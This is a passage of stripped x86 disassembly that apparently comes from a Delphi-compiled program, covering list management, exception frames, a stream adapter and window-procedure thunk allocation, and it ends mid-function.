mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_419270
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_419428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_4192bc
push ebx
push esi
push ecx
call sub_4034b4
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_419510
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_4194b8
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_413e48
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_419480
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_40349c
lea eax [ ebx + 0x14 ]
call sub_40cc70
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4138b8
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_419340
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413914
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41375c
mov edx ebx
mov eax esi
call sub_419340
sub_4193d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41375c
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x10 ] eax
sub_419400
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4139fc
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403128
xor eax eax
mov [ ebx + 0x10 ] eax
sub_419428
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403324
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_4193d4
mov dl 0x1
mov eax ebx
call sub_419948
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_4198f8
sub_419480
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_419948
mov edx ebx
mov eax esi
call sub_419400
pop edi
pop esi
pop ebx
retn
sub_4194b8
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4139a0
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_419480
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_419400
sub_419510
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4138b8
call sub_419510
inc edi
dec esi
jne r-xdata
sub_41954c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_4139fc
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403128
xor eax eax
mov [ ebx + 0x14 ] eax
sub_419570
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41954c
mov edx ebx
mov eax esi
call sub_41954c
pop esi
pop ebx
retn
sub_41958c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_419570
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4138b8
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_4195e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_419394
push ebx
push sub_4193bc
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_4193a8
push ebx
push sub_4193c8
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_4196e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407b58
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_419778
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
sub_419778
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4138b8
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407b58
test al al
jne r-xdata
sub_4197c8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404284
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407cdc
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
xor edx edx
mov eax ebx
call sub_419948
mov edx esi
mov eax ebx
call sub_419854
mov dl 0x1
mov eax ebx
call sub_419948
sub_419868
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4138b8
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413844
sub_4198a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_413914
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4137a8
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_413934
sub_4198f8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_419894
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_419868
mov cl 0x1
mov edx ebx
call sub_4198f8
inc edi
dec ebp
jne r-xdata
sub_419948
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404114
mov edx esp
mov eax esi
call sub_4033fc
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_419990
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_4199b8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_419a00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4031dc
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_419a40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_419a60
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_419a84
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_419acc
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
mov edx esi
call sub_419cfc
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_419b34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_419cfc
mov edx ebx
mov eax esi
call sub_419cf0
sub_419b78
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419270
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_419bbc
push ebx
push esi
push edi
call sub_4034b4
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4192bc
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_419570
jmp r-xdata
mov eax esi
call sub_4139a0
mov edx eax
mov eax edi
call sub_419cfc
lea eax [ edi + 0x50 ]
call sub_40cc70
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40349c
sub_419c1c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41958c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_419c48
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_419c64
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_419c80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4138b8
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_419cfc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4137a8
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4138b8
cmp ebp eax
jne r-xdata
sub_419d3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_419570
mov edx ebx
call sub_419340
sub_419d68
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_419db0
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403128
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_419de8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_419e37
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419e50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_419e9f
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419eb8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_419f22
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_419f3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_419f85
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_415594
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_419fa0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405528
xor eax eax
push ebp
push sub_41a18d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41a166
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026bc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41a155
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403960
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a194
lea eax [ ebp + 0xc ]
call sub_4054b4
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403960
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41a1d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41a233
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a264
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_413c24
mov edi eax
xor eax eax
push ebp
push sub_41a2b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a2c0
mov eax [ rw-data ]
call sub_413c88
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4138b8
call sub_403128
inc esi
dec ebx
jne r-xdata
sub_41a2d8
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41a300
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028b8
mov edx sub_41a2d8
lea eax [ esi + 0x5 ]
call sub_41a2f8
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41a2f8
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41a3bc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_4068b4
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a300
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41a470
push ebx
push esi
mov esi eax
push 0xfffffffc
